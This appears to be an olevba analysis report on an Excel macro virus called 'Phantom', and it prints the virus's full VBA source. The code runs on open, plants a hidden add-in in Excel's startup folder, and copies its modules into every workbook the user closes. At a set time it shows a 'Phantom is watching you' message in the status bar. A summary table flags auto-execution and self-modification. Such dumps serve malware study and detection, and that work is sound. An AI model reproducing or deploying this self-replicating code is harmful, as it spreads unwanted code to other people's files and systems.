olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Phantom-7ed58effabbd53da8b04dce3e2601a318aeeca43
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Phantom-7ed58effabbd53da8b04dce3e2601a318aeeca43 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Phantom-7ed58effabbd53da8b04dce3e2601a318aeeca43 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Phantom-7ed58effabbd53da8b04dce3e2601a318aeeca43 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Phantom-7ed58effabbd53da8b04dce3e2601a318aeeca43 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ArtiLife.bas 
in file: Virus.MSExcel.Phantom-7ed58effabbd53da8b04dce3e2601a318aeeca43 - OLE stream: '_VBA_PROJECT_CUR/VBA/ArtiLife'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Dim Replica As New Replicator

Sub Auto_Open()
    Set Replica.App = Application
    If ThisWorkbook.Path <> Application.StartupPath Then Replica.Initialize
    Application.OnTime TimeValue("16:00:00"), "DeliverPayload"
End Sub

Sub DeliverPayload()
    Replica.Activate
End Sub

-------------------------------------------------------------------------------
VBA MACRO Replicator.cls 
in file: Virus.MSExcel.Phantom-7ed58effabbd53da8b04dce3e2601a318aeeca43 - OLE stream: '_VBA_PROJECT_CUR/VBA/Replicator'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public WithEvents App As Application
Private dpath As String

Private Sub App_WorkbookBeforeClose(ByVal Wb As Workbook, Cancel As Boolean)
    Dim infwb As String
    On Error Resume Next
    infwb = Wb.Name
    If Infchecker(infwb) = False Then Import infwb
End Sub

Private Sub App_WorkbookOpen(ByVal Wb As Workbook)
    Dim infwb As String
    On Error Resume Next
    infwb = Wb.Name
    If Wb.Path <> Application.StartupPath Then
        If Infchecker(infwb) = True Then Remove infwb
    End If
End Sub

Function Export(wkbk As String)
    dpath = Application.DefaultFilePath
    Workbooks(wkbk).VBProject.VBComponents("Artilife").Export (dpath & "\~a0183")
    Workbooks(wkbk).VBProject.VBComponents("Replicator").Export (dpath & "\~r0183")
End Function

Function Initialize()
    Dim curname As String
    Dim backgrounder As Object
    Dim stpath As String
    On Error Resume Next
    Application.ScreenUpdating = False
    curname = ThisWorkbook.Name
    stpath = Application.StartupPath
    Export curname
    Set backgrounder = Workbooks.Add
    backgrounder.IsAddin = True
    Import backgrounder.Name
    backgrounder.SaveAs (stpath & "\~xl.xla")
    Application.ScreenUpdating = True
End Function

Function Import(ByVal wkbk As String)
    dpath = Application.DefaultFilePath
    Workbooks(wkbk).VBProject.VBComponents.Import (dpath & "\~a0183")
    Workbooks(wkbk).VBProject.VBComponents.Import (dpath & "\~r0183")
End Function

Function Remove(wbname As String)
    Dim vbart As Object, vbrep As Object
    Set vbart = Workbooks(wbname).VBProject.VBComponents("Artilife")
    Set vbrep = Workbooks(wbname).VBProject.VBComponents("Replicator")
    Workbooks(wbname).VBProject.VBComponents.Remove vbart
    Workbooks(wbname).VBProject.VBComponents.Remove vbrep
End Function

Private Function Infchecker(wbname As String) As Boolean
    On Error Resume Next
    Dim vbp As Object
    Infchecker = False
    For Each vbp In Workbooks(wbname).VBProject.VBComponents
        If StrComp(vbp.Name, "Replicator", 0) = 0 Then
            Infchecker = True
            Exit For
        End If
    Next vbp
End Function

Function Activate()
    Dim msg(26) As String
    Dim i As Integer
        For i = 0 To 26
            msg(i) = Right("               The Phantom", i + 1)
            Application.StatusBar = msg(i)
                If i Mod 2 = 0 Then
                    Application.Wait TimeSerial(Hour(Now()), Minute(Now()), Second(Now()) + 1)
                End If
        Next i
    Application.StatusBar = "             Is watching you!"
    Application.Wait TimeSerial(Hour(Now()), Minute(Now()), Second(Now()) + 3)
    Application.StatusBar = "             Beware!"
    Application.Wait TimeSerial(Hour(Now()), Minute(Now()), Second(Now()) + 3)
    Application.StatusBar = False
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

